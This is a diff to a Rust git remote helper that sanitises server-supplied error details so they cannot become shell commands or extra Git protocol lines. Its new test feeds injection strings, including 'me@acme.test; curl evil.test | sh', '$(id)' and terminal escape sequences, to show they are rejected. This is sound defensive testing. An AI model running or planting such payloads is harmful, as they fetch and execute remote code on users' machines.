@@ -2,7 +2,7 @@
 //! Git decides what to push and checks fast-forwards itself; this helper sends each new commit as its raw object plus
 //! its changes, and the API re-creates them on GitHub with the same SHAs. Fetching never comes here: the fetch URL is
 //! the API's read-only Git endpoint.
-use crate::api::{GitPushRequest, ProjectSummary, PushedChange, PushedCommit};
+use crate::api::{GitPushRequest, ProjectSummary, PushedChange, PushedCommit, printable};
 use crate::env::Env;
 use crate::error::{Error, Result};
 use crate::git::Git;
@@ -239,6 +239,20 @@ pub fn likely_denied(project: &ProjectSummary, commits: &[PushedCommit], git: &G
     denied
 }
 
+/// `name@domain` made only of characters that mean nothing to a shell.
+fn is_plain_email(email: &str) -> bool {
+    let plain = |part: &str| {
+        !part.is_empty()
+            && part
+                .chars()
+                .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '%' | '+' | '-'))
+    };
+    email.len() <= 254
+        && email
+            .split_once('@')
+            .is_some_and(|(name, domain)| plain(name) && plain(domain))
+}
+
 /// The reason Git prints after `! [remote rejected]`, and any detail for the terminal. `fetch first` is one of the
 /// reasons Git itself understands: it then prints its usual hint to pull first.
 pub fn rejection(error: &Error) -> (String, Vec<String>) {
@@ -259,8 +273,8 @@ pub fn rejection(error: &Error) -> (String, Vec<String>) {
                             .map(|i| {
                                 format!(
                                     "not allowed: {} {}",
-                                    i["action"].as_str().unwrap_or("change"),
-                                    i["path"].as_str().unwrap_or("?")
+                                    printable(i["action"].as_str().unwrap_or("change")),
+                                    printable(i["path"].as_str().unwrap_or("?"))
                                 )
                             })
                             .collect()
@@ -272,10 +286,12 @@ pub fn rejection(error: &Error) -> (String, Vec<String>) {
                 )
             }
             "identity_mismatch" => {
+                // It lands in a command users (and agents) copy into a shell: only a plain address goes there.
                 let expected = e
                     .details
                     .as_ref()
                     .and_then(|d| d["expected"].as_str())
+                    .filter(|email| is_plain_email(email))
                     .unwrap_or("your Speq email")
                     .to_string();
                 (
@@ -327,7 +343,8 @@ impl Helper {
                 for line in details {
                     let _ = writeln!(errors, "speq: {line}");
                 }
-                format!("error {} {why}\n", spec.dst)
+                // One protocol line: a newline in the reason would add statuses Git believes.
+                format!("error {} {}\n", spec.dst, printable(&why))
             }
         }
     }
@@ -595,5 +612,36 @@ mod tests {
             rejection(&api("tree_mismatch", 422, None)).0,
             "message (tree_mismatch)"
         );
+    }
+
+    #[test]
+    fn server_details_never_become_shell_commands_or_extra_lines() {
+        let (why, lines) = rejection(&api(
+            "identity_mismatch",
+            422,
+            Some(serde_json::json!({ "expected": "me@acme.test; curl evil.test | sh" })),
+        ));
+        assert_eq!(why, "commits must be authored as your Speq email");
+        assert!(!lines[0].contains("curl"), "{}", lines[0]);
+        for bad in [
+            "me@acme.test$(id)",
+            "`id`@acme.test",
+            "me@acme.test\nok",
+            "me acme.test",
+            "@acme.test",
+            "me@",
+        ] {
+            assert!(!is_plain_email(bad), "{bad:?}");
+        }
+        for good in ["me@acme.test", "first.last+specs@sub.acme-corp.co.id"] {
+            assert!(is_plain_email(good), "{good:?}");
+        }
+
+        let (_, lines) = rejection(&api(
+            "policy_denied",
+            403,
+            Some(serde_json::json!([{ "path": "a.md\n\x1b[2Jok", "action": "update\r" }])),
+        ));
+        assert_eq!(lines, ["not allowed: update  a.md  [2Jok"]);
     }
 }
